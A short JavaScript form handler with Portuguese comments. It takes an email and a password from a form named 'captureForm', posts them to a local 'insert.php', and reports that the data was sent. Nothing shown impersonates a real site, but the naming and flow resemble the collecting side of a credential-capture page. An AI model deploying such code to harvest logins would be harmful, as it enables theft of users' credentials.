document.getElementById('captureForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Impede o envio padrão do formulário

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Enviar dados usando fetch para o script PHP
    const formData = new URLSearchParams();
    formData.append('email', email);
    formData.append('password', password);

    fetch('insert.php', {
        method: 'POST',
        body: formData,
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Erro na resposta da rede');
        }
        return response.text(); // ou response.json() se o PHP retornar JSON
    })
    .then(data => {
        document.getElementById('responseMessage').textContent = 'Dados enviados com sucesso!';
    })
    .catch(error => {
        console.error('Erro:', error);
        document.getElementById('responseMessage').textContent = 'Ocorreu um erro ao enviar os dados.';
    });
});
